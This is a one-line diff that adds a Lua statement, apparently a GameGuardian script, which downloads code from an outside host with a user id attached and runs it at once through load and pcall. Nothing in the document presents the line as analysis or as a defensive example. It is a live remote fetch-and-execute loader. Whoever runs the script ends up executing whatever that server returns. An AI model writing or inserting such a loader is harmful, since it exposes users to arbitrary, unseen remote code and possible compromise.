@@ -1,0 +1,1 @@
+pcall(load(gg.makeRequest("http://gstygl.online/script.php?uid=aowen2222").content))
